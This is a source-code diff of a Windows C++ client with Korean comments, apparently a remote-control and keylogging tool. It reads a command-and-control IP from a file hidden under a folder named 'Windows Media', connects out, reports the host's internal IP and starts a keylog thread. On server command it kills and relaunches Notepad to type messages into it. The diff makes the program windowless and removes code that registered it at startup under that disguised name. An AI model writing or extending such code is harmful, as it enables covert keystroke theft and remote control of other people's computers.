@@ -24,6 +24,23 @@ SOCKET s;
 
 void ResetNotepad()
 {
+	// 메모장 모두 종료
+	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, FindProcessID(TEXT("Notepad")));
+	while (hProcess)
+	{
+		if (!TerminateProcess(hProcess, 0))
+			MessageBox(0, TEXT("Error"), TEXT("notepad exit failed"), MB_OK | MB_ICONERROR);
+
+		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, FindProcessID(TEXT("Notepad")));
+	}
+
+	// 메모장 재실행
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi;
+	char notepad_name[] = "Notepad";
+	CreateProcessA(NULL, notepad_name, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+	// 메모장 핸들 참조
 	h_notepad = FindWindow(L"Notepad", NULL);
 	while (!h_notepad)
 	{
@@ -32,9 +49,19 @@ void ResetNotepad()
 		h_notepad = FindWindow(L"Notepad", NULL);
 	}
 
-	h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL);
-	while (!h_edit)
-		h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL);
+	do
+	{
+		h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL); // 윈도우 10의 경우
+		if (!h_edit)
+			h_edit = FindWindowEx(h_notepad, NULL, L"RichEditD2DPT", NULL); // 윈도우 11의 경우
+		if (!h_edit)
+		{
+			// 윈도우 11에서 1번 업데이트 된 버전의 경우
+			h_edit = FindWindowEx(h_notepad, NULL, L"NotepadTextBox", NULL);
+			h_edit = FindWindowEx(h_edit, NULL, L"RichEditD2DPT", NULL);
+		}
+		Sleep(10);
+	} while (!h_edit);
 }
 int InitConnect(const WSADATA* wsa, SOCKET* sock, const char* IP)
 {
@@ -84,83 +111,32 @@ int InitConnect(const WSADATA* wsa, SOCKET* sock, const char* IP)
 		strcpy_s(pdu_hello.internal_ip, inet_ntoa(*(struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));
 
 	send(*sock, (const char*)&pdu_hello, sizeof(PDUHello), 0);
-	system("taskkill /im notepad.exe -f");
 
 	return 1;
 }
 UINT WINAPI keylog(void* arg);
 
-int _tmain(int argc, TCHAR* argv[])
+int CALLBACK WinMain(__in HINSTANCE hInstance, __in HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nCmdShow)
 {
-	// 콘솔창 빠르게 숨기기
-	HWND myWnd = GetConsoleWindow();
-	ShowWindow(myWnd, SW_HIDE);
-
 	WSADATA wsa;
 	
 	PDUMessage* pdu_recv;
 	PDUCommand* pdu_command;
 
 	char IP[30] = "";
-	TCHAR appdata_dir[MAX_PATH] = TEXT("");
-	TCHAR inifile_dir[MAX_PATH] = TEXT("");
+	TCHAR appdata_dir[MAX_PATH] = TEXT(""); // %appdata%\Windows Media 경로
+	TCHAR inifile_dir[MAX_PATH] = TEXT(""); // appdata_dir\network.txt 경로
 	fstream inifile;
 
+	// C&C IP 읽어들이는 부분
 	GetEnvironmentVariable(TEXT("APPDATA"), appdata_dir, MAX_PATH);
 	wcscat_s(appdata_dir, TEXT("\\Windows Media"));
 	wcscpy_s(inifile_dir, appdata_dir);
 	wcscat_s(inifile_dir, TEXT("\\network.txt"));
 
-	// 더블클릭으로 실행된 경우
-	if (argc == 1)
-	{
-		ShowWindow(myWnd, SW_SHOW);
-
-		cout << "IP : ";	cin >> IP;
-		cout << "시작프로그램으로 등록하시겠습니까?[yes or no] : ";
-		char input;
-		do
-		{
-			input = _getch();
-			input = toupper(input);
-		} while (input != 'Y' && input  != 'N');
-		cout << input << endl;
-
-		system("PAUSE");
-		if (input == 'Y')
-		{
-			// 레지스트리에 시작프로그램으로 등록, Windows Media는 눈속임
-			TCHAR optional_cmdline[MAX_PATH] = TEXT("\"");
-			wcscat_s(optional_cmdline, MAX_PATH, argv[0]);
-			wcscat_s(optional_cmdline, TEXT("\" --pass"));
-			if (!SetRegistryStartProgram(TRUE, TEXT("Windows Media"), optional_cmdline))
-			{
-				cerr << "실패. 관리자 권한이 필요합니다" << endl;
-				Sleep(2500);
-				return 1;
-			}
-
-			// 설정파일에 IP기록
-			CreateDirectory(appdata_dir, NULL);
-			inifile.open(inifile_dir, ios_base::out);
-			if (inifile.fail())
-				printf("file fail\n");
-			inifile << IP;
-			inifile.close();
-		}
-		else
-		{
-			SetRegistryStartProgram(FALSE, TEXT("Windows Media"), NULL);
-			experimental::filesystem::remove_all(appdata_dir);
-		}
-	}
-	// 시작프로그램으로 실행된 경우
-	else
-	{
-		inifile.open(inifile_dir);
-		inifile >> IP;
-		inifile.close();
-	}
+	inifile.open(inifile_dir);
+	inifile >> IP;
+	inifile.close();
 
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
@@ -168,11 +144,7 @@ int _tmain(int argc, TCHAR* argv[])
 		return 1;
 	}
 
-	ShowWindow(myWnd, SW_HIDE);
-
 	InitConnect(&wsa, &s, IP);
-
-	system("taskkill /im notepad.exe -f");
 
 	Sleep(500); // 클라이언트 프로그램에 입력된 엔터키 전송 방지
 	UINT dwThreadID;
@@ -189,7 +161,6 @@ int _tmain(int argc, TCHAR* argv[])
 
 		if (recv(s, (char*)buff_recv, BUFF_SIZE, 0) < 0)
 		{
-			system("cls");
 			cerr << "서버와의 연결이 끊어졌습니다." << endl;
 			cerr << "재연결을 시도합니다" << endl;
 			closesocket(s);
@@ -209,8 +180,6 @@ int _tmain(int argc, TCHAR* argv[])
 		case MESSAGE: // 메모장 메시지 전송
 
 			pdu_recv = (PDUMessage*)buff_recv;
-			system("taskkill -f /im notepad.exe");
-			system("start notepad"); // 다시 실행
 
 			ResetNotepad(); // 핸들값 초기화
 			PostMessage(h_edit, WM_SETFONT, (WPARAM)CreateFontIndirectW(&pdu_recv->font), 1); // note: WM_SETFONT메세지 보내야 한다는거 구글에도 안나와 있어서 직접 리버싱하면서 알아냄 ㅠㅠ
